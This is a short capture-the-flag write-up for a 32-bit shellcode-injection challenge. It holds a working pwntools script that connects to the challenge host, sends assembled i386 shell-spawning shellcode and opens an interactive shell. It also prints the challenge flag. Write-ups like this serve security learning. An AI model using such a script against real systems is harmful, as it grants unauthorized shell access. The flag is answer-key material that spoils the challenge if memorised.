# I got 32 shells

# Approach
In this ques, the we have to inject a shellcode into the prompt and it will execute the shellcode.\
The ELF file provided was 32 bit.

Let's use pwntools for this as it makes it very easier.

```
from pwn import *


conn = remote('wannahack.copsiitbhu.co.in',2430)
conn.recvline()
conn.recvline()
conn.recvline()
conn.recvline()
conn.recvline()
conn.recvline()

payload = (shellcraft.i386.sh())
print("payload: ", payload)
payload = asm(payload, arch='i386')
conn.send(payload)
print(conn.recvline())
print(conn.recvline())
conn.interactive()
```

`shellcraft.i386.sh()` will provide the 32-bit assembly instructions to enter into the shell.

'asm(payload, arch='i386')' will assemble the assembly code into bytes.

On executing this, you will get the access to bash shell.<br>

In this way, you get the flag.<br>
flag: `wannahack{5h311c0d3_0n_32b1t_1s_50_01d_:(}`<br>
